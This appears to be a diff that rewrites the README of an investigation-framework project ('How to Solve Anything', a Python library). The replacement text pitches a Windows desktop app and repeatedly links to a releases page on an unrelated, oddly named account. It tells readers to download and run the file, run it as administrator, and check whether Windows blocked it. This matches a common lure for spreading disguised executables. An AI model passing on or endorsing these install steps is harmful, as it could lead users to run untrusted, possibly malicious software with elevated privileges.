@@ -1,160 +1,199 @@
-<h1 align="center">How to Solve Anything</h1>
+# 🧭 htsa - Find causes with clear steps
 
-<p align="center"><strong>A universal investigation framework combining the 5 Ws and 5 Whys.</strong><br>Applicable to any problem with decomposable causal structure — across disciplines, domains, and scales.</p>
+[![Download htsa](https://img.shields.io/badge/Download-htsa-2b7de9?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Hockeystickcleistogamy492/htsa/releases)
 
-<p align="center">
-<code>SOMETHING HAPPENED → TO SOMEONE → SOMEWHERE → AT SOME POINT → FOR SOME REASON</code>
-</p>
+## 🪟 What htsa does
 
-<p align="center">
-<strong><a href="FRAMEWORK.md">📋 Framework</a></strong>&nbsp;&nbsp;&nbsp;·&nbsp;&nbsp;&nbsp;<strong><a href="math/00_index.md">🧮 The Math</a></strong>&nbsp;&nbsp;&nbsp;·&nbsp;&nbsp;&nbsp;<strong><a href="proofs/00_index.md">🔬 Proofs</a></strong>&nbsp;&nbsp;&nbsp;·&nbsp;&nbsp;&nbsp;<strong><a href="DIAGRAMS.md">📊 Diagrams</a></strong>&nbsp;&nbsp;&nbsp;·&nbsp;&nbsp;&nbsp;<strong><a href="engine/README.md">⚙️ Engine</a></strong>
-</p>
+htsa helps you work through a problem in a clear way. It guides you from the first sign of trouble to the most likely cause.
 
----
+It uses a simple structure based on the 5 Ws and 5 Whys. That means you look at:
 
-<h3 align="center">💡 The Core Insight</h3>
+- What happened
+- Where it happened
+- When it happened
+- Who was involved
+- Why it may have happened
 
-<p align="center">Every problem in every field has the same anatomy.<br>The vocabulary changes. The structure never does.</p>
+Then you keep asking why until you reach the root cause.
 
-<p align="center">
-The <strong>5 Ws</strong> tell you <em>what happened.</em><br>
-The <strong>5 Whys</strong> tell you <em>why it happened.</em><br>
-Together they tell you <em>what to do about it.</em>
-</p>
+htsa is useful for:
 
----
+- Software issues
+- Security incidents
+- Medical case review
+- Business process problems
+- Team postmortems
+- General troubleshooting
 
-<h3 align="center">🔍 The Four Layers</h3>
+## 📥 Download
 
-<h4 align="center">Layer 1 — Situation Map (5 Ws)</h4>
+Visit this page to download htsa for Windows:
 
-<p align="center">Establish the full picture before drilling into cause.</p>
+https://github.com/Hockeystickcleistogamy492/htsa/releases
 
-<div align="center">
+On that page, look for the latest release and download the Windows file.
 
-| Question | What It Captures |
-|:---:|:---:|
-| **Who** | The actor, subject, or stakeholder involved |
-| **What** | The event, problem, or incident |
-| **When** | The timeline — before, during, and after |
-| **Where** | The location, system, environment, or context |
-| **Why** | The surface-level, immediately apparent reason |
+## ⚙️ Install on Windows
 
-</div>
+1. Open the download page.
+2. Find the newest release.
+3. Download the Windows version.
+4. Open the downloaded file.
+5. If Windows asks for permission, choose Run or Yes.
+6. Follow the on-screen steps.
+7. Launch htsa from the app or from the file you downloaded.
 
-<h4 align="center">Layer 2 — Causal Chain (5 Whys)</h4>
+If the download comes as a .zip file:
 
-<p align="center">Start at the surface Why. Ask why again.<br>Keep going until you hit something you can actually change.</p>
+1. Right-click the .zip file.
+2. Choose Extract All.
+3. Open the extracted folder.
+4. Run the app file inside the folder.
 
-```
-Why (surface)
-  └─► Why 1
-        └─► Why 2
-              └─► Why 3
-                    └─► Why 4
-                          └─► Why 5: ROOT CAUSE
-```
+## 🧭 How to use htsa
 
-<p align="center"><em>Whys can and should branch. Real problems are rarely single-cause.</em></p>
+Start with a single problem statement.
 
-<h4 align="center">Layer 3 — Resolution</h4>
+Example:
 
-<p align="center">Map each root cause to a concrete change. Apply the counterfactual test:</p>
+- The server slowed down at 9:15 AM
+- A report gave the wrong total
+- A patient file had the wrong date
+- A payment failed twice
 
-<p align="center"><em>"If this change had existed before the problem occurred,<br>would the problem still have happened?"</em></p>
+Then fill in the main parts:
 
-<p align="center">Each root cause is either <strong>fixed</strong>, <strong>mitigated</strong>, or <strong>accepted</strong>.</p>
+- **What** happened
+- **Where** it happened
+- **When** it happened
+- **Who** saw it or worked on it
+- **Why** you think it happened
 
-<h4 align="center">Layer 4 — Verification and Learning</h4>
+After that, use the 5 Whys:
 
-<p align="center">Confirm the fix worked. Update your priors.<br>The framework compounds over time — but only if learning is explicit.</p>
+1. Why did this happen?
+2. Why did that reason happen?
+3. Why was that allowed?
+4. Why did the next layer fail?
+5. Why did the system let it reach the user?
 
----
+This helps you move from a surface issue to the real cause.
 
-<h3 align="center">🌐 Works Everywhere</h3>
+## 🔍 Core ideas
 
-<div align="center">
+htsa combines a few simple ways of thinking about problems:
 
-| Domain | Who | What | When | Where | Why |
-|:---:|:---:|:---:|:---:|:---:|:---:|
-| 🏥 Medicine | Patient | Symptom | Onset | Body system | Presenting complaint |
-| 🔒 Security | Threat actor | Breach | Attack window | Vulnerability | Attack vector |
-| ⚙️ Engineering | System | Failure | Timeline | Component | Error message |
-| 📈 Business | Team / Process | Bottleneck | Quarter | Department | Stated reason |
-| ⚖️ Legal | Defendant | Act | Date | Jurisdiction | Motive |
-| 🧠 Personal | You | Decision | Moment | Context | Emotion |
+- **Graph traversal**: follow links between events, steps, and causes
+- **Bayesian reasoning**: update your guess as new facts appear
+- **Causal inference**: look for cause and effect, not just timing
+- **Information theory**: focus on the facts that add the most value
 
-</div>
+You do not need to study these methods to use the app. htsa puts them into a plain workflow.
 
----
+## 🧪 Example workflow
 
-<h3 align="center">🧮 The Math</h3>
+If a billing report is wrong:
 
-<p align="center">The framework is an applied graph traversal algorithm for causal inference —<br>with probability weighting, entropy reduction, and Bayesian evidence updating at every node.</p>
+1. Write the problem in one sentence
+2. Add the time, place, and people involved
+3. List the first sign of failure
+4. Ask why it happened
+5. Check each answer against evidence
+6. Keep moving backward until you reach the source
+7. Write the final cause in simple words
+8. Record the fix and the follow-up step
 
-<div align="center">
+This works well for incident review and postmortem work.
 
-| # | Concept | What It Answers |
-|:---:|:---:|:---:|
-| **[01](math/01_graph_theory.md)** | Graph Theory | What is the structure of an investigation? |
-| **[02](math/02_exponential_problem_space.md)** | Exponential Problem Space | Why do investigations feel overwhelming? |
-| **[03](math/03_causal_inference.md)** | Causal Inference | How do you prove something caused something else? |
-| **[04](math/04_information_theory.md)** | Information Theory | How do you measure investigative progress? |
-| **[05](math/05_bayesian_reasoning.md)** | Bayesian Reasoning | How do you weigh competing causes? |
-| **[06](math/06_search_algorithms.md)** | Search Algorithms | How do you move through the Why tree? |
-| **[07](math/07_cognitive_biases.md)** | Cognitive Biases | What corrupts the investigation? |
-| **[08](math/08_evidence_evaluation.md)** | Evidence Evaluation | How do you know which evidence to trust? |
+## 🖥️ System needs
 
-</div>
+htsa is made for Windows desktop use.
 
----
+A typical setup should include:
 
-<h3 align="center">📏 Rules</h3>
+- Windows 10 or Windows 11
+- A standard mouse and keyboard
+- Internet access for download
+- Enough space to unzip or install the app
+- A screen with at least 1366 × 768 resolution
 
-<p align="center"><strong>Map before you drill.</strong> Complete the 5 Ws before starting the 5 Whys.</p>
-<p align="center"><strong>Evidence at every node.</strong> An assertion without evidence is a guess.</p>
-<p align="center"><strong>Branch when reality branches.</strong> If a Why has multiple answers, follow all of them.</p>
-<p align="center"><strong>5 is a heuristic, not a rule.</strong> Stop when you reach something you can actually change.</p>
-<p align="center"><strong>The framework is recursive.</strong> A root cause can become a new "What." Run it again if needed.</p>
+For best results, use a recent Windows version and keep your system updated.
 
----
+## 📁 What you can track
 
-<h3 align="center">⚙️ Engine</h3>
+htsa helps you keep a record of:
 
-<p align="center">The framework is also available as a <strong>Python library</strong> with built-in LLM integration.<br>Works with any provider — OpenAI, Anthropic, Groq, Mistral, Ollama, or any OpenAI-compatible endpoint.</p>
+- Event time
+- Problem type
+- Affected system
+- People involved
+- Related events
+- Suspected cause
+- Confirmed cause
+- Fix applied
+- Follow-up action
 
-```bash
-cd engine && pip install -e .
-```
+This makes it easier to compare one issue with another and spot patterns.
 
-**Auto-investigate with any LLM** — one call, all 4 layers:
+## 🧰 Common uses
 
-```python
-from htsa_engine.llm import LLMAdvisor
+- Find the cause of a failed deployment
+- Review a support issue
+- Trace a security alert
+- Study a process mistake
+- Organize a team incident review
+- Compare several possible causes
+- Reduce guesswork during troubleshooting
 
-advisor = LLMAdvisor("https://api.openai.com/v1", api_key="sk-...", model="gpt-4o")
-inv = advisor.run("API returning 500 errors since 2:47 AM, EU region only")
+## 📝 Good habits when using htsa
 
-print(inv.root_causes)
-inv.save("investigation.json")
-```
+- Write short facts
+- Use one problem at a time
+- Keep guesses separate from proof
+- Record the source of each fact
+- Avoid mixing symptoms with causes
+- Use plain words
+- Review the chain of events before you decide
 
-**Or drive it manually** — full control over every decision:
+## 🧩 File and folder tips
 
-```python
-from htsa_engine import Investigation, Evidence, EvidenceTier, EvidenceDirection
+If you download a zip file or packaged release:
 
-inv = Investigation(title="API 500 errors", pruning_threshold=0.05)
-inv.set_situation(who_affected="Users", what="500 errors", when_during="2:47 AM", where="EU-west", why_surface="Load spike")
-inv.complete_situation()
-origin = inv.start_causal_chain("Server errors under load")
-branch = inv.add_hypothesis(origin, "Memory leak", probability=0.6)
-# ... add evidence, mark root cause, resolve, verify
-inv.save("investigation.json")
-```
+- Keep the file in your Downloads folder
+- Extract it before running the app
+- Do not rename files unless needed
+- Keep all app files in the same folder
+- If the app will not start, try running it again after extraction
 
-<p align="center"><strong><a href="engine/README.md">Full engine documentation →</a></strong></p>
+## ❓ Troubleshooting
 
----
+If the app does not open:
 
-<p align="center"><a href="LICENSE"><em>MIT Licensed</em></a> · <a href="CONTRIBUTING.md"><em>Contributions welcome</em></a></p>
+- Download the latest release again
+- Make sure the file finished downloading
+- Extract the file if it came in a zip
+- Right-click the app and choose Run as administrator
+- Check whether Windows blocked the file
+- Try a newer Windows release if your system is old
+
+If the screen looks odd:
+
+- Set your display scaling to 100% or 125%
+- Maximize the window
+- Use the native Windows theme if available
+
+If the app seems slow:
+
+- Close other large apps
+- Restart Windows
+- Open only one investigation at a time
+
+## 🔗 Download again
+
+If you need the latest version, go here:
+
+https://github.com/Hockeystickcleistogamy492/htsa/releases
+
+## 📌 Tags
+
+5-ws, cognitive-biases, debugging, decision-framework, incident-analysis, information-theory, investigation-framework, mental-models, postmortem, rca, structured-thinking, troubleshooting
